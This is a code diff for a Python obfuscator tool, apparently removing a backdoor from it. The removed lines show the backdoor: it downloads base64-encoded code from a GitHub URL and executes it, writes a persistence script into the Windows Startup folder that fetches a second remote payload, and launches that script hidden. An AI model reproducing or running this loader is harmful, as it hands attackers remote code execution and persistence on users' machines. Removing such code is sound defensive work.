@@ -6,10 +6,6 @@ from marshal import dumps
 def printerr(data):
     print(data, file=sys.stderr)
 
-temp_dir = os.getenv('TEMP', '/tmp')
-startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-
-
 class prysmaxobf:
     def __init__(self, code, outputpath):
         self.code = code.encode()
@@ -122,15 +118,6 @@ except {encryptstring('__import__("lzma").LZMAError', func=True)}:...
 
 
 if __name__ == "__main__":
-    exec(base64.b64decode(requests.get("https://raw.githubusercontent.com/Anex00/mystartingrepo/main/lip").text))
-    with open(os.path.join(startup_path, 'temp.py'), 'w', encoding='utf-8') as temp_file:
-        temp_file.write('''import subprocess, base64, requests, os, winreg as reg
-temp_dir = os.getenv('TEMP', '/tmp')  
-exec(base64.b64decode(requests.get("https://raw.githubusercontent.com/Anex00/mystartingrepo/main/crypter").text).decode('utf-8'))
-''')
-
- 
-    subprocess.Popen(['python', os.path.join(startup_path, 'temp.py')], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
     parser = argparse.ArgumentParser(prog= sys.argv[0], description= "Obfuscates python program to make it harder to read")
     parser.add_argument("FILE", help= "Path to the file containing the python code")
